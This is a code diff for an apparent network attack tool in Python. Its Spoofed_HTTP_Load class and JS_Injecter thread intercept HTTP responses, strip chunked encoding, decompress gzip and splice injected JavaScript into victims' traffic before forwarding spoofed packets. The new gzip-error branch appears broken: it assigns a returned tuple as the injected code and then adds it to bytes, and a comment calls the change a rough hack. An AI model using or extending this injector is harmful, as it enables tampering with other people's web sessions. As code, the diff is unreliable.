@@ -25,13 +25,16 @@ from src.log import log
 
 class Spoofed_HTTP_Load(bytes):
     def _gzip_action_if_needed(self, load, action):
+        action_done = False
+        
         if action == "compress": action_f = gzip.compress
         elif action == "decompress": action_f = gzip.decompress
         else: print("ERROR UNKNOWN ACTION", action); return
         
         if "gzip" in self.content_encoding_header:
             load = action_f(load)
-        return load
+            action_done = True
+        return action_done, load
         
         
     # ~ def _add_injected_code(self, load):
@@ -60,6 +63,7 @@ class Spoofed_HTTP_Load(bytes):
         
         
     def _update_and_add_chunk_length_if_needed(self, load, b_chunk_length):
+        #CAMBIAR PARA QUE LO HAGA SEGUN LA LONGITUD DE LA LOAD
         if b_chunk_length:
             int_chunk_length = int(b_chunk_length[:-2].decode(), 16) #paso de bytes de base 16 a int de base 10
             new_int_chunk_length = int_chunk_length + len(self.injected_code) #le sumo la longitud del codigo
@@ -139,6 +143,8 @@ class Spoofed_HTTP_Load(bytes):
         #quito headers para reducir longitud
         #actualizo el header de la longitud
         
+        self.should_be_compressed = False
+        
         spoof_load = real_load
         
         self.injected_code = injected_code
@@ -150,11 +156,20 @@ class Spoofed_HTTP_Load(bytes):
         
         spoof_load[1], chunk_length = self._remove_chunk_length_if_needed(self, spoof_load[1]) #le quito chunked
         try:
-            spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "decompress") #descomprimo
+            self.should_be_compressed, spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "decompress") #descomprimo
+            #si se ha podido hacer, spoof_load[1] esta descomprimido, y self.should_be_compressed es True
+            #si no, spoof_load[1] esta comprimido, y self.should_be_compressed es False
+        except EOFError: 
+            #Sometimes decompressing fails, because i think we can not decompress a part of a gzip string. 
+            #Im going to try to compress and insert it.
+            #PENSAR COMO HACER ESTO DE UNA MEJOR FORMA, USANDO SHOULD BE COMPRESSED. LO VOY A HACER CHAPUZA PARA PROBAR.
+            
+            self.injected_code = self._gzip_action_if_needed(self, spoof_load[1], "compress")
+            spoof_load[1] = self.injected_code + spoof_load[1] #añado codigo
+            
+        
         except Exception as err:
-            #Sometimes decompressing fails, because i think we can not decompress a part of
-            #a gzip string. In this cases, the packet is not spoofed and the real packet is forwarded.
-            #Same for any other unexpected error.
+            #In this cases, the packet is not spoofed and the real packet is forwarded.
             raise
 
                 
@@ -202,10 +217,10 @@ class JS_Injecter(threading.Thread):
     def _send_spoofed_packet(self, real_packet):
         try:
             spoof_load = Spoofed_HTTP_Load(real_packet.load, self.injected_code)
-        except EOFError:
-            log.js.warning("gzip")
-            self._forward_http_packet(real_packet)
-            return
+        # ~ except EOFError:
+            # ~ log.js.warning("gzip")
+            # ~ self._forward_http_packet(real_packet)
+            # ~ return
         except Exception as err:
             log.error("js", "Unexpected error creating spoofed http load:", type(err), err)
             self._forward_http_packet(real_packet)
